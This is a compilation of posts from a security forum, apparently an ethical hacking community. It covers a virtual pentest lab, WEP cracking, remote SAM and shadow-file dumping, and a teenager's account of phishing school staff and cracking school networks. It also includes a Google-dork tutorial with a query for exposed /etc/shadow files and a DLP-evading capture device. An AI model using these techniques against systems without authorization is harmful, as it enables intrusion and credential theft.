1;Network pentest lab setupideo is at the page =) http://www.securityaegis.com/?p=525 remember those good ole days in the sandbox?  where you threw stuff around learned where the sand goes and… doesn’t go? well we’ve graduated from the sandbox, but hearts and minds are still wired to play there.  maybe that’s why we love offsec, let’s get to the point though… we made a lab. we wanted to address pentest labs. in this post in particular, network pentest labs (webapp will be a separate post, challenge sites will be as well) we used an existing set of hack challenge iso’s, sandbox vm’s, vulnerable software, and vulnerable os’s to create a 6 target lab that can be expanded upon. network pentesting lab tutorial here is what you need to download:    1. de-ice challenge disks 1& 2 – register for the heorot.net forums to get dl access,  http://forums.heorot.net/    2. pwnos – register for the heorot.net forums to get dl access,  http://forums.heorot.net/    3. damn vulnerable linux –  http://www.damnvulnerablelinux.org/  and add-ons at  http://www.crackmes.de    4. bt4 –  http://www.remote-exploit.org/backtrack_download.html    5. windows xp sp2    6. windows server 2003    7. vmware server -   http://www.vmware.com/products/server/ this lab is focused on a virtual environment. pentesting involves testing many different systems, so we recommend using vmware server. the flexibility of deploying targets and then saving their default installs as snapshots is absolutely necessary.  in a physical lab with an unconstrained budget we’d use  pre-configured hard drives with images that we’d “hot swap” out depending on the engagement. in this sandbox we hone our skills with nmap, netcat, metasploit, hydra, nessus, exploit code, pivoting, clientsides, etc. – not necessarily in that order. we decided to keep everything off the interwebs as we did this setup. this way we won’t have to deal with letting our isp know attack traffic might be coming from a machine or two. first we download pwnos. pwnos is a vm released by heorot.net denizen bond00. since it’s already in vm form we setup its network and launch the machine. this target is exploit centric differing slightly from our next target setups, the de-ice disks. a quick ping sweep will verify it’s online. this target will require you to search for an exploit, compile it, and up priv. second you need to download the de-ice pentest challenge disks. thomas wilhelm has created 3 attack challenge iso’s .  we’ll let you go about finding the vulnerabilities, but they work very well for showcasing mis-configuration testing and other attacks. we used the two level 1 disks, but he has a level 2 disc available also.  you can expand the network to add that disk later if you chose to, it showcases a harder pentest situation.  the de-ice disks should be configured and setup as per our video.  after that they just sit there for the plundering. next up is damn vulnerable linux. dvl is an interesting platform. not only is it a target, it’s also a testbed. dvl is very insecure, exploitable, but also contains a tutorial within itself for beginning exploit dev and cracking. sometimes dvl is frustrating to use due to language barriers, but most of the time you can figure out the kinks. dvl is closely tied to the  http://www.crackmes.de/  website where new challenges called “crackmes” and “exploitmes” can be downloaded. the forums there have a lot of info on the distro which is used to teach offensive security and reverse engineering to a broad skill set of infosec folks in education environments in the eu. next up we setup our attack platform, backtrack 4 (pre release).  i’m pretty sure we all know bt as one of the industry default attack, audit, and testing environments. some infosec professionals use their own home brewed distros. you could do this too. it’s just a pain to compile and setup all the tools. bt4 does all this for us, its stable, and made by some of the most brilliant minds in infosec.  regardless of which attack platform you use, we recommend keeping the remote-exploit forums in your links, as it is indispensable in troubleshooting common offsec tools. lastly we run some microsoft boxes. we skipped setting up the 2003 box as a domain controller on the video… because that’s boring. this setup allows us to test software on ms platforms. what we will say is make snapshots of these installs and don’t delete them (after you setup the domain). -the domain setup allows us to test post exploitation, account hijacking, client server packet sniffing, priv escalation, process migration (meterpreter goodness), pivoting, etc. -snapshots give us the capability to test old service packs or security updates on a regular basis, as well as analyze malicious code’s changes to the os when a new conficker comes slithering around. -the boxes themselves are also used for deploying vulnerable software to for testing exploits (don’t forget about clientsides) which can be downloaded from: http://www.oldapps.com/ http://www.oldversion.com/ https://www.securinfos.info/old-softwar ... erable.php all in all, this setup seemed to support all our needs for a network pentesting lab. it has multiple os’s, multiple targets, avenues for configuration testing, avenues for exploitation, and post exploitation. it is expandable with extra iso’s, os’s, updates, software, etc. we’re still working on adding some virtual devices to play with evasion, but that’s down the road. we don’t know everything (in fact, we know very little) and we appreciate comments and emails about how to make this setup better. if you know of a testing distro we missed for network pentest labs let us know. got a trick of the trade to make this better? hit us up. we give credit
1;Pentesting question: Disabled DHCPhave 2 computers in my room and for about 3 months i used my router without encryption, then this past few weeks i noticed my internet connection became slower even if im just surfing the net. i presumed that somebody is leeching from my connection so i put on wep encryption (i know its weak), enabled mac filtering, disabled dhcp put only 2 static ips from my 2 computers. changed my gateway from 192.168.0.1 to 192.168.5.100 and changed the ip range to 192.168.5.104-105. my connection became normal again. i tried to crack my connection from my 2nd computer, i used aircrack from backtrack 3 and cracked the password for just about 25k ivs   . but i cant connect to the internet because there is no dhcp to give me an ip address. now my question is: how can i sniff for the ip range i put on my d-link router? i tried using wireshark, netstumbler, can & abel but none of these sniffers gave me the ip address. maybe because im not really connected to the network, it says limited or no connectivity.â   does this mean i am now secured just by disabling the dhcp? im doing this because if i want my network to be safe, i should think like a hacker. anybody here knows how to "really" connect to the network on this circumstances? what programs should i use and what do i need to do? thanks in advance
3;Mobile Botnets Have Arrivedpdate: analysts see alarming development in mobile malware for the first time, a piece of mobile malware can send and receive information from a remote server, signaling the arrival of mobile botnets by jeremy kirk | idg news service the first worm that spreads between mobile devices by spamming text messages has developed a new communications capability that one security vendor says signals the arrival of mobile botnets. trend micro has analyzed a piece of mobile malware known as "sexy space," which is a variant of another piece of mobile malware called sexy view, which targets devices running the symbian s60 os. sexy view, which was detected by vendors such as f-secure six months ago, is significant because it is the first known malware sample that spreads by sms (short message service). it appeared initially in china. infected phones would send smses to everyone in the phones contact list with a link to a web site. if someone clicked the link, they would then be prompted to install sexy view, which purports to offer pornography-related content. in another advancement, those who wrote sexy view were able to get the application approved and signed by symbian. the os manufacturer, now owned by nokia, vets applications for security using both manual and automated processes, said mikko hypponen, chief research officer for f-secure. sexy views creators were somehow able to subvert that automated vetting process, allowing the application to access functions such as sms, hypponen said. the latest variant, sexy space, is also signed by symbian. but in the latest alarming development, trend micro analysts have found that sexy space is capable of downloading new sms templates from a remote server in order to send out new sms spam, said rik ferguson, senior security advisor for trend. no malware for a mobile device has been know to do that before. analysts at trend had "heated internal discussions" about whether sexy space qualified as botnet code, ferguson said. sexy space is also capable of stealing subscriber and network information from the device and sending it to a remote server, ferguson said. sexy space confirms what analysts such as hypponen and ferguson have said since late last year: as mobile devices take on greater functionality and operate like minicomputers, its likely they will be targeted by malware writers and eventually lassoed into botnets. botnets -- arguably one of the biggest security threats facing the internet -- are networks of hacked computers that can be used to send spam, conduct denial-of-service attacks on web sites or steal data. hypponen said f-secure analysts had not confirmed that sexy space calls on a remote server, and trend engineers are still studying where the remote server is located. its not clear now many phones may be infected. but one beijing mobile security vendor, netqin tech, wrote on its blog that infections had been widespread in china and saudi arabia. f-secure informed symbian about the malware. it is possible for network operators to revoke the certificate that allows an application to run on a symbian phone, hypponen said. but the revocation mechanisms are not automatic, and depending on the operators setup, it may not work for all phones, hypponen said. symbian has taken action to disable the malware. craig heath, one of symbians security developers, wrote on the organizations security blog that it has revoked the content certificate and publisher certificate used to sign the malware. "that means that the symbian software installer will not now install the malware, providing that revocation checking is turned on," heath wrote. "unfortunately, revocation checking is often turned off by phone manufacturers, because the data traffic could cause problems for people who do not have a data plan as part of their service or who pay for data by volume." f-secure has a writeup  of the malware, also known as "transmitter."  trend has also posted an analysis . original article: http://www.infoworld.com/d/mobilize/ana ... alware-538 do
1;Password crackingam currently in the password cracking section of my studies, and much to my dismay, the written part of the guide seems to have glossed over acquiring passwords for windows and nix systems. im sure the videos will provide examples, but the forums are here for a reason, might as well use them. so i know that during system hacking, password files are often transferred from the remote machine to the hackers computer. starting with windows, how is this done? obviously the hacker gets remote access and a command prompt, probably of a limited user.â  can the sam be accessed with a lu account, or does it require elevated privileges? so i just learned about the syskey function. this seems to be a mute point because i know i have cracked passwords offline using lc5 and ophcrack. so i need to ask, if syskey something i need to be aware of when conducting password attacks?  most importantly, how do i dump the sam remotely? im on youtube now, but im guessing most videos will be showing local dumps. of course the same question needs to be asked of linux, how do i retrieve the shadow file and dump them to a remote pc (my attacking pc)
1;Skiddie harassmentell i guess since this is my first post i will introduce myself. hell@ from teh internetz! i am currently an it technician with a love for security (greyhat). ive been doing lots of reading and some practical applications with backtrack, aircrack-ng, etc. i have learned lots but still have a long way to go and i know this.  i am a long time lurker and now my first post! here it is: today a employee came to me describing an issue he is having at home. apperently someone have taken control of family members facebook and msn, not much i can do for him there; but the second thing he told me was the the hacker (its a skiddie) has actual control over the pc including webcam (which they demostrated for them) and from the sounds of it atleast a keylogger on top that. this person with access has told them he(they) has been taken pics with the webcam and is threatning to use them in malicous ways. now what you need to understand is that this is all against some young children and its quite sickening to me.  i havent actually had access to the laptop yet so i have to be kinda vague for now. i know i can find the trojan and remove it (no problem there) but i would like to see what i can do about helping the police (there useless) im going to try and log the ip of the skiddie. its a windows xp system more than likely not update properly etc. (i will do this for them aswell) most of what im learning focuses on gaining access and not working from the other way around.  right now my plan is to get the laptop for a few days and see if {they} connect to it again and see what info i can pull, now other than an array of netstat commands when theyre connected and pulling the logs from the router, what else can i do to dig up more info?  edit: this still sounds like a skiddie to me, they flaunt there access to there webcam (really? what real hacker cares about a webcam), i wont be surprised to find subse7en or some other torrent found tool on there. i just need to log some usefull info if i can
2;Sandia Cyber Security Researchers Boot 1 Million Linux VMsow thats one heck of a virtual lab! livermore, calif. — computer scientists at sandia national laboratories in livermore, calif., have for the first time successfully demonstrated the ability to run more than a million linux kernels as virtual machines.  the achievement will allow cyber security researchers to more effectively observe behavior found in malicious botnets, or networks of infected machines that can operate on the scale of a million nodes. botnets, said sandia’s ron minnich, are often difficult to analyze since they are geographically spread all over the world.  sandia scientists used virtual machine (vm) technology and the power of its thunderbird supercomputing cluster for the demonstration.  running a high volume of vms on one supercomputer — at a similar scale as a botnet — would allow cyber researchers to watch how botnets work and explore ways to stop them in their tracks. “we can get control at a level we never had before,” said minnich.  previously, minnich said, researchers had only been able to run up to 20,000 kernels concurrently (a “kernel” is the central component of most computer operating systems). the more kernels that can be run at once, he said, the more effective cyber security professionals can be in combating the global botnet problem. “eventually, we would like to be able to emulate the computer network of a small nation, or even one as large as the united states, in order to ‘virtualize’ and monitor a cyber attack,” he said.  a related use for millions to tens of millions of operating systems, sandia’s researchers suggest, is to construct high-fidelity models of parts of the internet.  “the sheer size of the internet makes it very difficult to understand in even a limited way,” said minnich. “many phenomena occurring on the internet are poorly understood, because we lack the ability to model it adequately. by running actual operating system instances to represent nodes on the internet, we will be able not just to simulate the functioning of the internet at the network level, but to emulate internet functionality.”  a virtual machine, originally defined by researchers gerald j. popek and robert p. goldberg as “an efficient, isolated duplicate of a real machine,” is essentially a set of software programs running on one computer that, collectively, acts like a separate, complete unit. “you fire it up and it looks like a full computer,” said sandia’s don rudish. within the virtual machine, one can then start up an operating system kernel, so “at some point you have this little world inside the virtual machine that looks just like a full machine, running a full operating system, browsers and other software, but it’s all contained within the real machine.” the sandia research, two years in the making, was funded by the department of energy’s office of science, the national nuclear security administration’s (nnsa) advanced simulation and computing (asc) program and by internal sandia funding.  to complete the project, sandia utilized its albuquerque-based 4,480-node dell high-performance computer cluster, known as thunderbird. to arrive at the one million linux kernel figure, sandia’s researchers ran one kernel in each of 250 vms and coupled those with the 4,480 physical machines on thunderbird. dell and ibm both made key technical contributions to the experiments, as did a team at sandia’s albuquerque site that maintains thunderbird and prepared it for the project.  the capability to run a high number of operating system instances inside of virtual machines on a high performance computing (hpc) cluster can also be used to model even larger hpc machines with millions to tens of millions of nodes that will be developed in the future, said minnich. the successful sandia demonstration, he asserts, means that development of operating systems, configuration and management tools, and even software for scientific computation can begin now before the hardware technology to build such machines is mature.  “development of this software will take years, and the scientific community cannot afford to wait to begin the process until the hardware is ready,” said minnich. “urgent problems such as modeling climate change, developing new medicines, and research into more efficient production of energy demand ever-increasing computational resources. furthermore, virtualization will play an increasingly important role in the deployment of large-scale systems, enabling multiple operating systems on a single platform and application-specific operating systems.”  sandia’s researchers plan to take their newfound capability to the next level.  “it has been estimated that we will need 100 million cpus (central processing units) by 2018 in order to build a computer that will run at the speeds we want,” said minnich. “this approach we’ve demonstrated is a good way to get us started on finding ways to

3;Asking To Get Owned?lright, i have a friend who works at best buy. he works in the computer section and over there theyve partnered with a couple isps to help get customers set up with internet at their homes. i was making the isp switch just last week when i noticed that the computer they were using to sign customers up for internet service had no anti-virus / firewall. it honestly just looked like a default out of box installation of vista.  once i noticed this i instantly went, "wow", and mentioned it to my buddy (the guy who works there). he goes, "yeah, i know bro, can you believe they use wep for our routers encryption too?". was in a sort of wow moment there for a second and i thought, "this is the home of the geek squad", youd certainly think they have a networking guy on board somewhere thats concerned with this? maybe im just rambling on about nothing here, but i definitely see how attackers pull off these mass credit card stings from examples like how tj max got hacked awhile back : http://news.cnet.com/t.j.-maxx-hack-exposes-consumer-data/2100-1029_3-6151017.html  and even more recent ones. i instantly thought to myself, that there could be a guy in a van in the parking lot right now with an alfa card sniffing traffic and they wouldnt know. i guess i was just surprised to see companies relying on wep as a security scheme when it can be broke in a matter of minutes. i wouldnt be surprised to hear about this best buy getting owned within a few months if they keep this up. its unpredictable to really say how long theyve been using wep for their encryption and what other computers dont have proper protection. just my rant though, any thoughts on the subject
3;My story.ell... first of all, please dont make fun of me. im new to these forums as you see, but i hope i can fit here, and, who knows, make some friendships, that would be the best. well, im in a period of my life in which no one can help me except one of you guys, because i dont know what to do. im 16, and this is my story. it has all started when i was 13. for the first time i got internet on my own computer, and there was everything very strange to me. ive learned to surf, i "got a life" in the virtual world, i got a moderator position on a warez forum. i think the hacking started in there. as any newbie started, ive met prorat and got to know with it. not really breaking into other peoples computers. actually, i only did it once, had my fun and disconnected. thenâ  ive continued to learn, simple things as html and php... and then, the phishing came... some accounts phished and sold.. made it almost for a year i think... in the meanwhile, i got bored of everything, i got "divorced" from hacking a few months, when i discover something at my school. a program called deepfreeze that just wouldnt let you do anything. i searched and read a lot about it on the internet. the producers of it thought it was so good that they offered a prize to whoever was able to crack it. and it was. but it was just something out of my control. i couldnt learn if i wasnt able to know where the information was. so, downloaded a cd and cracked it by there, removing the password... it wasnt so much fun that way. the, did other script kiddie stuff, some admin passwords on windows xp cracked on the school library, all that. but one day i used a simple method ive learned to search admin panels on websites, by just adding "admin.php" and others to the main website adress. the funny thing was, and this was when the real thing started, my high schools site had that. something like "site.com/admin.php" no passwords, no security at all, right into the admin panel. i wasnt able to believe. my school also had some e-mail adresses provided by a main company that serves the schools, i did that on their website and i was able to acess most of the usernames and passwords used by schools to acess. i contacted the website explaining what i found there and they thank me. i felt good. a really good feeling. and so, i needed more. i had to have more acess to more stuff at my school. because if such a failure was hapening in their website, then what else could i have acess? so, i got the e-mail and i phished the vice-director of my school. clean shot, said and done. and currently have, and more plenty of other services that the school use, conversations she was with other directors and presidents. i got acess to plenty of stuff, plenty of password to sites that i shouldnt even know that they existed. but i want more. i want to prove them that their security is as bad as it can get. in the meanwhile, i notest something in the bar. so, the things worked like this: you go to the bar, you buy the ticket for the product you want, you go to the place you are served and you trade the ticket for the product, so, one day i notested the cash registers name and model, i gathered some money with other 3 friends, i bought a machine equal to the school, bough a ticket to each thing they had at school and ive programmed the cash register machine. we could eat for free at school, and nobody was knowing about nothing. another thing triggered my attention, the coke machines. ohh, old coke machines. ive tried the sooo old codes like 4-2-3-1, acessed the machines menu... boring. ive searched on the internet how their lock worked, what was it, and how could be broken. they mostly use tubular locks, made in the 30s. it was a major breatrough because they were very good at the time, and very resistent to lockpicking. but... found some ways to get over it. there was a tool capable of opening any tubular lock, which was this: http://www.tubularpick.com/ but obviously it was too damn expensive to me. bought some tubular locks and keys on ebay and made something like this: http://www.youtube.com/watch?v=rnbv8wffica so, there was a coke machine at the gym, but there was always some employee in there. so we wait for some tournaments day at the gym, football, basquetball, whatever, as long as there was many people in there. i got closed to the machine while some friends covered me and opened the machine with sucess. took a (not really good) photo, closed the machine and got off. next, the wireless networks in the school. both students and teachers networks were encrypted with wep. so, what was that, and how could it be cracked? we discover that the students could have acess to their network, but not so easily. they had to go with their laptop to the network manager, providing their mac adress and give them their laptop so he could enter the password. so, it had mac adress filtering. how to solve thing, how to hack it? my laptop doesnt have pcmcia, only express slots. so, made some money and bought something on ebay that did the same but being usb. with the monitor mode and packet injection. after some days (and nights) trying to find a correct way to crack my own network, i finally made it and never got so happy. so, went to school ready to crack theirs. got a mac adress from a friend of mine which i used to sucessfully crack the students network and having acess. now, the teachers network got cracked too. the security breach was that the "multimedia cars" as they call it on school, portable pcs with projectors with internet connection, thad acess to the teachers network. so, in one class, some friends distracted my teacher while another wrote on the cmd some comands i told and i wrote down the mac adress used by the machine. on the next break, the network had been cracked. photos were taken to prove it, passwords were kept. i have also developped interest with cracking reall apps, software, as i am an administrator of a warez forum in my country, and thats why i have studied assembly, read some courses about how to work with olly debugger, and was able to sucessfully crack 3 apps. i know it is not enough, but i had so much fun doing it, and i gave jumps of hapinness when i finally cracked each one lol. weve done almost everything. but i think it is still not enough... i got one more year left at school. and i dont know what to do. i want to know, though, what do you guys think of me and of who i am and what ive done. am i a script kiddie? what can i improve? well... sorry guys for the big big text, but well it actually made me feel better to let this out and tell someone. i would really, really apreciate some coments of experienced people. thank you
2;Failed SE Pen Test Proves Credit Union Reacted Properlysocially engineered penetration test of a credit unions computer system went awry last week, resulting in the issuance of a fraud alert from the agency that supervises federal credit unions.   security testing organization microsolved sent a package to a credit union client last week, containing a fraudulent letter seemingly coming from the national credit union administration (ncua). also contained in the package were two cd-roms, part of a penetration test, microsolved said in a blog post friday. but, on the day the package was received, the person responsible for the test was out of the office. so the employee who received the suspicious letter, which bore a ncua logo and the bogus signature of former chairman michael fryzel, reported it to the ncua fraud hot line. on being notified of the suspicious letter and cd-roms, the ncua issued an alert last tuesday, warning all federal credit unions of the potentially dangerous disks. ncuas alert warned that the bogus letter directed recipients to run the educational cd-roms, but doing so could potentially result in a security breach.  microsolved said that the disks contained “simulated malware,” which is safe, does not propagate and is used for testing purposes. in a news release friday, the ncua said the incident was isolated to one credit union, and no others should have received the package “this was a controlled exercise in which the process worked,” microsolved said in its blog post. “the social engineering attack itself was unsuccessful and drew the attention of the proper authorities. had we been actual criminals and attempting fraud, we would have been busted by law enforcement.” in addition, though the outcome of the test was unintended, the employees reaction to the suspicious package was exemplary, microsolved said. the employee followed proper incident response processes by reporting the suspicious package to the hotline. "that the intended contact was not there made this a real world test," randy abrams, director of technical education at eset, wrote in a comment on microsolveds blog post about the incident. "the employee who blew the whistle should be congratulated on a job well done. the fact that the alert went out means that many more people were educated against one potential attack vector.” abrams told scmagazineus.com on monday that those who trained the employee "deserve kudos as well." but not everyone has been as enthusiastic about the test. while microsolved said in its blog post that the ncua, "understood the situation and seemed appreciative of our efforts," the ncua said in its own news release friday that the penetration test resulted in the “unauthorized and improper use of the ncua logo.” “credit unions are not authorized to create facsimile documents bearing ncua logos or signatures, or to improperly represent communications from ncua, even during the legitimate conduct of business, such as a computer security assessment,” the organization said. in addition, another commenter on the microsolved blog wrote, "i wonder if spoofing ncua is the best idea. i know that i would not be happy if i found out that a company was pretending to be us to fool someone into responding to a social engineering attack." original story: http://www.scmagazineus.com/purported-m ... le/147777/ do
0;Google Hacking: An Intro for Beginnersriginal article is at the following link- http://www.blogntweets.info/google-hack ... beginners/ [br] google hacking  is the process of employing complex search engine queries to locate sensitive information. because of various web server misconfigurations, sensitive information gets indexed by the search engines when spiders crawl them.the sensitive information may include:password files, confidential directories, logon portals,log files etc. basic search the most basic search involves searching for the required terms via the google’s web interface. e.g hacker ethical hacker the important thing to note here is that google searches are case insensitive. whether you search for (ethical hacker) or (ethical hacker) or (ethical hacker) it provides you the same number of results. phrase search phrase search involves enclosing the required terms in double-quotes. google searches for all the words in the phrase in the "exact" order you provide them. this is very useful when you are searching for a specific thing and want to omit extraneous results. case insensitivity is maintained in phrase search too. e.g.  "hacker" "ethical hacker" there are certain common words like "a", "and", "the", "for" etc. which google ignores in basic search. these words are called  stop words . stop words, when used in the phrase search are not excluded by google. advanced search google wildcard google treats asterisk (*) as a placeholder for any unknown  term(s)  and tries to find the best match(es) for it. it can be used both in basic as well as phrase search, but you have to separate it by a space from the preceding and succeeding words; e.g: you can * multiple * here, google will try to find best match(es) for the wildcard. [br] excluding words from search: the minus sign (-) sometimes you want to exclude pages containing certain words from the search result. you can do this by prefacing the minus (-) sign to the unwanted word. the minus sign should be preceded with a space and should be placed immediately before the unwanted term. a search such as (ethical hacker -cracker) will return pages containing  ethical hacker  but excluding the term  cracker . if you want to exclude multiple terms, you can do so by placing the minus sign before each term. e.g ethical hacker -cracker -blackhat computer virus -antivirus -antispyware [br] searching as is: the plus sign (+) sometimes, you want to include stop words in your search. one way to do this is by using them in a phrase search i.e enclosing it in double quotes. another way is to place a plus (+) sign before the stop word. the plus sign tells google to include the word succeeding it. similar to the minus sign, the plus sign should be placed immediately before the word you want included and should be preceded by a space.e.g +this +is +a test from this example, you can see that theres no limit to the number of plus sign you can use in a query. [br] googles boolean operators google allows you to use three boolean operators:  and, or and not         the and operator and operator is used to search multiple terms.e.g if you want to search for pages containing the terms;google, hacking and tutorial, you can construct your query as:-  google and hacking and tutorial  watch the above query carefully and you will see that it is just the basic google query. google includes the and operator by default. you do not have to use it. the not operator the not operator is used to exclude words from a search.the not operator is  not  supported by google. instead, google uses the minus sign to exclude terms. the or operator the default google search employs and operation. you can override this functionality using the or operator. the or operator (or is used in all caps) tells google to locate  either  one of several words. you can use the pipe symbol (|) instead of or to perform or operation.e.g the query ( google | microsoft ) returns all pages containing either google or microsoft or both. [br] query string length limit neglecting the stop words, you can search only up to 32 words in a single google query. google ignores any words after the first 32 words (excluding stop words) and returns a message. 153,000,000 results!..really? though google claims to find thousands - or millions - of results for any query, it lets you view only the first 1,000 results. if you try to go beyond the first thousand results, google displays an error message. advanced operators google provides a myriad of additional operators to enhance your search (or hacking!) experience. we will cover some of the most useful operators here. all the advanced google operators have the syntax-  operator:search_term(s) • there should not be any space between the operator, the colon and the search term. • the search term can be a single term or a phrase. searching within a domain:  site  operator syntax : site:domain this is perhaps the most useful google operator for reconnaissance. the  site  operator is used to limit search to a particular domain. e.g site:ethicalhacker.net this will return pages only from ethicalhacker.net site:sans.org training this will search only sans.org for the term training. [br] you can also exclude results from specific subdomains with the help of minus operator. e.g site:sans.org training -site:www.sans.org this will search sans.org for the term training but omits results from the subdomain www [br] searching the title:  intitle   and  allintitle   operators syntax : intitle:search_term syntax : allintitle:search_term(s) the  intitle  operator is used to search the title of the pages. e.g intitle:"google hacking"[/i] this will list all the pages with google hacking somewhere in their title. [br] it can also be combined with the  site  operator to limit search to a specific domain; e.g site:blogntweets.info intitle:"google hacking" [br] locating directory listings one of the most sinister uses of the  intitle  operator is in locating directory listings. directory listings include the phrase  "index of"  in their title. so, we can search for (intitle:"index of") or (intitle:index.of) to locate all the directory listings indexed by google. the period (.) in index.of is the wildcard for single character. you can also use this operator to search for password files; as, intitle:index.of etc shadow this will search for unix /etc/shadow password files [br] the  allintitle  is also used to match the title of a webpage, but it searches for all the words that follow it. e.g allintitle:penetration testing this query will search for webpages with the words penetration and testing. notice that unlike the  intitle  operator it does not require multiple words to be enclosed in quotes. [br] similar to the  intitle   operator, the  allintitle   operator can also be used to discover index directories. this operator does not gel well with other advanced operators; consequently, you should use the  intitle  operator instead. searching the url:  inurl   and  allinurl   operator syntax : inurl:search_term syntax: allinurl:search_term(s) the  inurl  operator is used to locate urls containing the search term.e.g inurl:hacker this will list all the urls containing the term hacker. [br] the  inurl:  operator can also be combined with the  site  operator to search urls associated with a specific domain. it can also be utilized to discover vulnerable scripts if the script names are included in the url. akin to the  inurl  operator,  allinurl  is also used to match the url of a webpage, but it searches for all the words following it. the  allinurl  operator also does not combine well with other advanced operators and its use should be refrained. searching for a specific file type:   filetype   and  ext   operators syntax : filetype:type_of_file syntax : ext:type_of_file google supports two operators to search for a specific type of file based on the file extension:  filetype  and  ext . you can use either of the two operators.e.g  filetype:pdf “google hacking” ext:pdf “google hacking” this will list all the .pdf files comprising the term ‘google hacking’ you can use both these operators together with the  site  operator to search for specific type of files in a particular domain.e.g • site:sans.org ext:doc training this will search sans.org for all the microsoft word document files comprising the term training. [br] links to a url:  link   operator syntax : link:url the  link   operator is used to find all the webpages that have links to the specified url. e.g link:www.blogntweets.info ink:www.ethicalhacker.net [br] viewing modified pages:  cache   operator syntax : cache:url whenever googlebot crawls a webpage, it caches a  snapshot   of that page. this cached version could be very useful if that page is recently deleted or inaccessible owing to other internet problems. if the page is deleted, you can view its cached version which is stored in googles server. every result that google hands you over for your query, it also provides a link to the cached version of that page. you can browse the cached version via the  cached  link below the snippet for that result. another way to view the cached page is via the google  cache  operator. e.g cache:www.blogntweets.info this will show you the cached version of the page when googlebot last crawled it. the current version of the page could be different than the cached version. [br] google cache could be very useful for an attacker if the website has modified their original content. it helps to view the old content of the page. google hacking  defenses disable directory listings directory listings give away too much information than a visitor needs. disabling it is always a good option. noindex your confidential files web crawlers can be forbidden from crawling a webpage using the noindex meta tag or by putting that url in the /robots.txt file. note that /robots.txt is publicly available; it shouldnt be used for hiding information as it can be viewed by anyone. noarchive to forbid caching you can prevent search engines from caching a webpage by employing the noarchive meta tag. employ google-fu against your own site you could perform these advanced searches against your website to discover any vulnerabilities. additionally, you can make use of automated tools like  wikto and  sitedigger  which will thoroughly scan your site. removing an indexed page if your confidential page has already been indexed by google, you van remove it via googles  url removal tool . additional resources • johnny "ihackstuff" long maintains a  google hacking database - a list of numerous advanced google queries which can be used to discover vulnerable targets. • johnny long is also the author of   google hacking for penetration testers  which is a must for any serious google hacker. • sans institute maintains a very handy   google cheat sheet . •  http://www.google.com/support/websearch/?hl=en •  http://www.googleguide.com
0;Interesting new DLP evasion and theft device...ran across a discussion on another forum about some new data theft device. although im still skeptical of its legitimacy. the poster was introduced to it in either china or korea. here is his post from the forum: features of this data theft product: - looks like a typical video adapter - plugs into your dvi/vga port, has another dvi/vga port on the other end for relay of video signals. - does not use usb port - comes with 16gb/8gb storage - no wireless comms - no built-in power, draws power from video output port, no energy signature when unplugged. mode of usage: 1. plug this data theft product into your video output port. 2. for pcs, connect to the actual monitor for a pc for display relay. 3. for laptops, enable display to external video output port by pressing the on-board function keys. 4. open a restricted document which you have access to but your dlp software has blocked copying, sending, printing and screen capture. 5. scroll down the restricted document. 6. when viewing the restricted document, display signals are stored onto the data theft products 16gb storage. 7. remove the data theft product 8. connect it to the decoding machine to replay the display of the restricted document, presumably outside the controlled premises. why is it so dangerous? a) easy to bypass physical checks most guards will not suspect that this "dvi/vga video adapter" comes with storage capabilities, especially when there is no usb connector. b) non-detection by os and dlp products this is not a usb drive. for pcs, there is absolutely no detection whatsoever by the os. for laptops, the os detects an external display, not an external storage. dlp products do not block main or secondary video display. hence, dlp products are totally useless against this product. c) capitalise on essential business usage patterns. business-wise, it may not be acceptable to block access to the laptops external video port as it will render business presentations from the laptop impossible. d) camera-free sites are now susceptible. as this product has no camera or lenses, it will not be blocked by the guards for being a camera-capable device. e) peer detection is not easy it can be attached to a third partys pc video output port for espionage as the pcs video output port is usually out of sight from the user. usage on a laptop is also inconspicuous. people sitting beside a perpetrator wont find the data theft device suspicious. this is more stealth than data theft through camera phones as the perpetrator looks normal, just handling the computer mouse and keyboard (no suspicious devices like camera phones) f) affordable cost it is made and sold somewhere in asia, your typical base of low cost production.  the video device only stores the raw vga/dvi signals and does not encode into a video file. it still requires an adapter to extract the stored signals and a client pc software to encode the signals into a playable video file. gaining device power through vga/dvi is nothing new but the recording of raw video stream with only 8gb/16gb of flash memory seems questionable. the other thing he mentioned is that there is no internal cpu. there are vgatousb/wifi/just about anything out there now but they require software on the machine and are rather large. and they are not cheap...
2;Hacked E-Mails Fuel Global Warming Debatefficially, i cant condone the actions of those that broke into these systems. but i do find it very intriguing that in al gores documentary, falsifying scientific evidence is something he accused the other side of doing. in fact, its the results of the evidence that he says is the inconvenient truth that the opposition chooses to ignore or deny. im all for an open debate on the facts, so im glad its all coming out. i just wish there was another way to do so. an online debate over global warming science has broken out after an unknown hacker broke into the e-mail server at a prominent, british climate-research center, stole more than a thousand e-mails about global warming research and posted them online. global warming skeptics are seizing on portions of the messages as evidence that scientists are colluding and warping data to fit the theory of global warming, but researchers say the e-mails are being taken out of context and just show scientists engaged in frank discussion. the climate research unit at the university of east anglia is one of the united kingdom’s leading climate research centers and has been a strong proponent of the position that global warming is real and has human causes. the center confirmed the hack occurred in an e-mail statement to threat level. “we are aware that information from a server in one area of the university has been made available on public websites,” the statement read. “we are extremely concerned that personal information about individuals may have been compromised. because of the volume of this information we cannot currently confirm what proportion of this material is genuine.”  the stolen cache includes more than 1,000 e-mails and more than 3,000 documents, some containing code. they were posted anonymously to an ftp server in russia. the hacker then posted a link to the 61-mb file of data on the blog air vent. the hacker’s message that accompanied the link read: “we feel that climate science is, in the current situation, too important to be kept under wraps. we hereby release a random selection of correspondence, code and documents.” the e-mails, which cover a decade of correspondence, are getting a lot of attention among bloggers who point to statements in them that they say suggest the scientists colluded and manipulated data to support their global warming viewpoints. the bloggers highlight a statement in one 1999 e-mail from phil jones, director of the research center: i’ve just completed mike’s nature trick of adding in the real temps to each series for the last 20 years (i.e., from 1981 onwards) and from 1961 for keith’s to hide the decline. the comment refers to michael mann, director of the earth system science center at pennsylvania state university. mann told threat level the “nature trick” refers to a solution for displaying data that he and others used in a paper they published to get around a problem in the way that temperature data is traditionally displayed. the solution allows for better viewing and understanding of the data, mann said, and pointed to a post on the realclimate blog that his colleagues have made to explain the reference. that post also indicates that the hacker first tried to post the trove of stolen data to the realclimate blog on tuesday. another e-mail from jones dated last year with the subject line “ipcc and foi” is a request to michael mann, asking him to delete certain e-mails. bloggers allege that jones was trying to destroy data that had been requested under the freedom of information act. jones wasn’t available for comment. mann told threat level that he never deleted any e-mails and doesn’t know the context under which jones made the request. full story: http://www.wired.com/threatlevel/2009/11/climate-hack do

